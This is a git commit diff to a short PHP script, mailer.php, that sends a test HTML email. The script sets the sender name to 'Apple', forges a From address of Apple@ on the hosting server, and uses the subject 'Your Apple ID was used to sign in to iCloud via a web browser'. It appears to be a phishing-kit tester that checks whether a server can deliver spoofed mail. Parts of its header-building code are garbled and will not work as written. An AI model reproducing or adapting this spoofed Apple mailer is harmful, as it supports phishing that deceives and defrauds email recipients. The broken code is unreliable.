8e5659614f874347b01915de893b14dc05b31a50
irvanberuq <52144823+irvanberuq@users.noreply.github.com>
2019-07-01 14:51:23 +0700

    Update mailer.php

--- mailer.php
+++ mailer.php
@@ -1,19 +1,19 @@
 <body bgcolor="black"> 
-<?php
-$name = "Apple Alert"; $to = "darknet1255@gmail.com"; $web="$_SERVER[HTTP_HOST]"; 
-$subject = "Your Order Has Been Placed"; 
-$body = ' 
-<a href="https://google.com">Tested Mail 1</a>  
-email = "Apple@$web"; 
+<?php 
+$name = "Apple"; $to = "irvanberuq@linuxmail.org"; $web="$_SERVER[HTTP_HOST]"; 
+$subject = "Your Apple ID was used to sign in to iCloud via a web browser"; 
+$body = '  
+<a href="https://google.com/">Hello world</a> how are you? '; 
+$email = "Apple@$web"; 
 $headers = 'From: ' .
 $email . "\r\n". 
 $headers = "Content-type: text/html\r\n"; 'Reply-To: ' . 
-$email. "\r\n" . 'X-Mailer: PHP/' . phpversion(); . phpversion(); 
+$email. "\r\n" . 'X-Mailer: PHP/' . phpversion(); 
 if (mail($to,
 $subject,
 $body,
 $headers,$name)) 
-{ echo("<font color=green>Email Sended To => $to </font>"); 
+{ echo("<font color=green>This Email Sended To => $to </font>"); 
 } else 
 { 
 echo("<font color=red>This Server Not Support For Mailer</font>"); } ?>
